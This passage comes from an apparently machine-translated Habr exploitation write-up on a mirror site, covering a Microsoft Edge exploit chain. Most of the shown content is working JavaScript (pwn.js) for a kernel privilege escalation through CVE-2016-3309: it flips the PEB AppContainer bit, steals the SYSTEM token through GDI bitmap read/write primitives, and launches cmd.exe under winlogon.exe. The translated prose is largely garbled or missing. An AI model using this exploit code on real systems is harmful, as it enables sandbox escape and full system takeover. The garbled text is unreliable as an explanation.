class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">      : </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="PWNED"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra" style=";text-align:right;direction:rtl">  3.           </h2><br><p style=";text-align:right;direction:rtl">         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote style=";text-align:right;direction:rtl"> GDI โ   Windows          , ,    . </blockquote><p style=";text-align:right;direction:rtl"> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p style=";text-align:right;direction:rtl">    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p style=";text-align:right;direction:rtl">    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p style=";text-align:right;direction:rtl">        <code>pwn.js</code>  : </p><br><pre style=";text-align:right;direction:rtl"> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">     : </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Final"></p><br><p style=";text-align:right;direction:rtl">   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog" style=";text-align:right;direction:rtl">  ูุคุฏู </h2><br><p style=";text-align:right;direction:rtl">   : </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li style=";text-align:right;direction:rtl">      <code>JS</code> </li><li style=";text-align:right;direction:rtl">    666    <code>JS</code> </li><li style=";text-align:right;direction:rtl">   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p style=";text-align:right;direction:rtl">   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy" style=";text-align:right;direction:rtl">  </h2><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Liu Jin โ The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Andrew Wesie, Brian Pak โ 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Natalie Silvanovich โ The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Natalie Silvanovich โ Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li style=";text-align:right;direction:rtl"> <a href="">phoenhex team โ cve-2018-8629-chakra.js</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Quarkslab โ Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Siberas โ Kernel Exploitation Case Study โ "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Saif El-Sherei โ Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Diego Juarez โ Abusing GDI for ring0 exploit primitives</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Nicolas A. Economou โ Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li style=";text-align:right;direction:rtl"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar455594/">https://habr.com/ru/post/ar455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar455584/index.html">ููุงุจูุงุช ูุฎุตุตุฉ ูุน ุงูููู ุงูุฏุงุฎููุฉ ููุดุฑูุฉ: ูู ุฎูุงู ุงูุฃุฎุทุงุก ุฅูู ุงูุงูุชุดุงูุงุช</a></li>
<li><a href="../ar455586/index.html">ุณูุณูุฉ ูุญุงุถุฑุงุช ุญูู ุงูุฑูุจูุชุงุช ููุฃุณุชุงุฐ ุฌุฑูุฌูุฑ ุดููุฑ ุ ูุฏูุฑ ูุนูุฏ ุงููุนูููุงุช ุงูุนุตุจูุฉ (INI) ุจูุฎูู ุ ุฃููุงููุง</a></li>
<li><a href="../ar455588/index.html">ููููุฉ ุชุซููู ูุฌุชูุนู ุญุชู ูุง ุชุฑูุต ูุน ุงูุฏู</a></li>
<li><a href="../ar455590/index.html">MVCC ูู PostgreSQL-8. ุชุฌูุฏ</a></li>
<li><a href="../ar455592/index.html">ุงูููุฑูุณุงุช ุงูุชู ุชูุงุฌู ุงูููุดุขุช ุงูุตูุงุนูุฉ ูุชูุฏูุฏ ููุฃูู ุงููุงุฏู</a></li>
<li><a href="../ar455596/index.html">DevConfX :: ุงูุฅุฏุงุฑุฉ - ุชูุงุฑูุฑ ุงููุฏูุฑูู ุจูููุงุช ุจุณูุทุฉ</a></li>
<li><a href="../ar455598/index.html">ุชุฑููุฉ ุนุงุฌู Exim ุฅูู 4.92 - ููุงู ุนุฏูู ูุดุทุฉ</a></li>
<li><a href="../ar455600/index.html">ููุตุฉ 3DEXPERIENCE ุชุณุงุนุฏ ูู ุฅูุดุงุก ูุณุงุฆู ููู ุนุงู ูููุณุชูุจู</a></li>
<li><a href="../ar455602/index.html">ุฅุซุงุฑุฉ ุงููุชุตูุญ ุชุนุทู ูุน ุงูุบููุถ ุงูุณูููู</a></li>
<li><a href="../ar455604/index.html">Ansible ูุฅุฏุงุฑุฉ ุชูููู ูููุฏูุฒ. ูุตุฉ ูุฌุงุญ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>